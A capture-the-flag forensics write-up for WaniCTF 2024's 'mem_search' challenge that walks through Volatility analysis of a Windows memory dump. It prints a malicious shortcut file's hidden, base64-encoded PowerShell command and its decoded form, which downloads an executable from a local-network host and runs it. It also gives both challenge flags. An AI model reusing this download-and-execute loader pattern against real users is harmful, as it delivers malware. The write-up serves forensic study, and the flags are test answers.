# WaniCTF 2024

## mem_search

> I found an unknown file, and upon opening it, it caused some strange behavior, so I took a memory dump!
> 
> How was the attack carried out?
> 
> The memory dump is large, and you can download it from the following URL (it will be 2GB when extracted).
> 
> Please note that the file may become unavailable after the WaniCTF event.
> 
> https://drive.google.com/file/d/1sxnYz-bp-E9Bj9usN8lRoL4OE8AxrCRu/view?usp=sharing
> 
> Note: There are two flags in the file. The flag that starts with FLAG{H is not the correct answer. Please submit the flag that starts with FLAG{D.
>
>  Author: Mikka
>

Tags: _forensics_

## Solution
This challenge comes with a memory dump we need to analyze. To analyze this [`https://github.com/volatilityfoundation/volatility3`](volatility) is a great tool (see [`https://blog.onfvp.com/post/volatility-cheatsheet/`](this) for a great starting point). Lets first gather a bit of information about the dump.

```bash
$ vol -f chal_mem_search.DUMP windows.info
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0xf8030e400000
DTB     0x1ad000
Symbols file:///home/ctf/.local/lib/python3.11/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/D9424FC4861E47C10FAD1B35DEC6DCC8-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 WindowsCrashDump64Layer
base_layer      2 FileLayer
KdDebuggerDataBlock     0xf8030f000b20
NTBuildLab      19041.1.amd64fre.vb_release.1912
CSDVersion      0
KdVersionBlock  0xf8030f00f400
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      1
SystemTime      2024-05-11 09:33:57
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Mon Dec  9 11:07:51 2019
```

We can see here a lot of informations already, which operation system the dump created etc. Since the description mentioned an `unknown file` lets list all the files and see if we find anything. We can also assume the file is somewhere in an `Users` subfolder if it was downloaded somehow.

```bash
$ vol -f chal_mem_search.DUMP windows.filescan | grep Users
0xcd88c94355f0.0\Users\Mikka\AppData\Local\Microsoft\Edge\User Data\Default\Visited Links       216
0xcd88c9df4710  \Users\Mikka\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\AppIconCache\100\{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_SnippingTool_exe  216
0xcd88c9df7460  \Users\Mikka\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\js\bcb47deee83e5416_0    216
0xcd88c9df7910  \Users\Mikka\AppData\Local\Microsoft\OneDrive\24.081.0421.0003\FileSyncHost.dll 216
0xcd88cbe2c0d0  \Users\Mikka\AppData\Local\Microsoft\TokenBroker\Cache\e8ddd4cbd9c0504aace6ef7a13fa20d04fd52408.tbres  216
...
0xcd88cebae1c0  \Users\Mikka\Downloads\read_this_as_admin.download      216
...
0xcd88cebc26c0  \Users\Mikka\Desktop\read_this_as_admin.lnknload        216
...
```

Beneath a lot of noise we find `read_this_as_admin.lnknload` on the desktop pointing to a `.download` file in the `Downloads` folder. This looks interesting, lets extract both.

```bash
$ vol -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebae1c0
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xcd88cebae1c0  read_this_as_admin.download     file.0xcd88cebae1c0.0xcd88ced4eaf0.DataSectionObject.read_this_as_admin.download.dat

$ vol -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebc26c0
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xcd88cebc26c0  read_this_as_admin.lnknload     file.0xcd88cebc26c0.0xcd88ced4e5f0.DataSectionObject.read_this_as_admin.lnknload.dat

$ cat file.0xcd88cebae1c0.0xcd88ced4eaf0.DataSectionObject.read_this_as_admin.download.dat
[ZoneTransfer]
ZoneId=3
ReferrerUrl=http://192.168.0.16:8282/
HostUrl=http://192.168.0.16:8282/read_this_as_admin.lnk

$ cat file.0xcd88cebc26c0.0xcd88ced4e5f0.DataSectionObject.read_this_as_admin.lnknload.dat
�8O� �:i�+00�/C:\V1�X3�Windows@ ﾇOwH�X�J.��
  WindowsZ1�X{cSystem32B        ﾇOwH�X�J.k���erSystem32t1�O�IWindowsPowerShellT ﾇO�I�X�H.�����WindowsPowerShell N1�X4�v1.0:     ﾇO�I�XDK.��'>�v1.0l2�PX@
                                 powershell.exeN        �PX@
                                                            �X�B.hi#��'powershell.exeh-gt$�C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exeC:\Windows\System32�-window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=C:\hack\shared\read_this.docx�%SystemDrive%\hack\shared\read_this.docx%SystemDrive%\hack\shared\read_this.docx�%�
�����Kp\��1SPS�XF�L8C���&�m�q/S-1-5-21-1812296582-1250191020-2086791148-100191SPS�mD��pH�H@.�=x�hH�o�P
```

The `.downloads` file looks not interesting, the `lnk` file on the other hand contains some `powershell` payload. Its obfuscated, but we can make sense out of it, the target is:

```ps
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=C:\hack\shared\read_this.docx�%SystemDrive%\hack\shared\read_this.docx%SystemDrive%\hack\shared\read_this.docx
```

That starts `powershell.exe` with hidden window and an `base64` encoded `powershell script`. Lets decode this and see what we have.

```bash
$ echo "JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=" |base64 -d
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

Ok, the result is not too crazy in fact. Some strings concatenations we can easily remove ourselfes.

```powershell
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

The code looks something like this.

```powershell
$u='http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ%3D%3D/chall_mem_search.exe';
$t='WaniTemp';
mkdir -force $env:TMP\..\$t;
try{
    iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;
}catch{
}
```

So, the script creates a folder, downloads the file `chall_mem_search.exe` and copies it to `\msedge.exe` and runs the program. The file should probably have been ended up in the created folder, but didnt... Anyways, also malware can have bugs. 

Lets extract the malware so we can inspect.

```bash
$ vol -f chal_mem_search.DUMP windows.filescan | grep msedge.exe
...
0xcd88cebd4af0  \msedge.exe     216
...

$ vol -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebd4af0
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xcd88cebd4af0  msedge.exe      file.0xcd88cebd4af0.0xcd88cd0caa60.DataSectionObject.msedge.exe.dat
ImageSectionObject      0xcd88cebd4af0  msedge.exe      file.0xcd88cebd4af0.0xcd88ccef87b0.ImageSectionObject.msedge.exe.img
```

To see whats going on, we open the `.exe.img` (which is a `PE32 executable (GUI) Intel 80386, for MS Windows`, as `file` tells us) with `Binary Ninja`. There are a lot of `tailcalls` leading is eventually to `sub_461ba0`, which contains a lot of `runtime boilerplate` and calls `invoke_main` which eventually ends up in the real `WinMain` function that does just spawn a message box.

```c
int32_t sub_461730()
{
    int32_t __saved_ebp;
    __builtin_memset(&__saved_ebp, 0xcccccccc, 0);
    j_sub_4617b0(&data_46c012);
    MessageBoxW(nullptr, u"B64 decode this!!! RkxBR3tIYWNrZ…", u"Wani Hackase", MB_OK);
    j___RTC_CheckEsp();
    j___RTC_CheckEsp();
    return 0;
}
```

The content shown is `B64 decode this!!! RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ==`, ok lets decode this.

```bash
$ echo "RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ==" | base64 -d
FLAG{Hacked_yikes_spooky}
```

Wow, the flag... But is it? In the description it was mentioned there are two flags, and the wrong one starts with `FLAG{H`... So sad. :-( But, this `B64 decode` rings a bell somehow, doesn't it?

We saw something similar in the path where the `powershell` script downloaded the file: `http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ%3D%3D/chall_mem_search.exe`. Wow, how didn't I catch this in the first place? Lets decode this to get the flag.

```bash
$ echo "RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==" | base64 -d
FLAG{Dayum_this_is_secret_file}
```

Flag `FLAG{Dayum_this_is_secret_file}`